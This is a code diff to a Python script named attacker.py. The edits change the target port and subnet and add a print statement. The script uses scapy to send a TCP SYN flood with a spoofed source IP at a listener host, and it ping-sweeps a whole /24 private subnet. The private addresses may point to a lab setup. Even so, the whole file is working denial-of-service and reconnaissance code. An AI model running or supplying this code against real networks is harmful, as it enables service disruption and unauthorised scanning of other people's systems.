@@ -1,23 +1,22 @@
 # attacker.py
 import tkinter as tk
 import requests
-from scapy.all import IP, TCP, send , ICMP
-
+from scapy.all import IP, TCP, send, ICMP
 
 # Define the IP and port of the listener
 listener_ip = '192.168.0.14'
-listener_port = 8080
-
+listener_port = 5123
 
 def send_syn_flood():
     src_ip = '10.0.0.1'
     dst_ip = listener_ip
     packet = IP(src=src_ip, dst=dst_ip)/TCP(dport=listener_port, flags='S')
+    print(f"Sending packet: {packet.summary()}")
     send(packet, count=100)
 
 def send_ping_sweep():
     for i in range(1, 256):
-        dst_ip = f"192.168.1.{i}"
+        dst_ip = f"192.168.0.{i}"
         packet = IP(dst=dst_ip)/ICMP()
         send(packet)
 
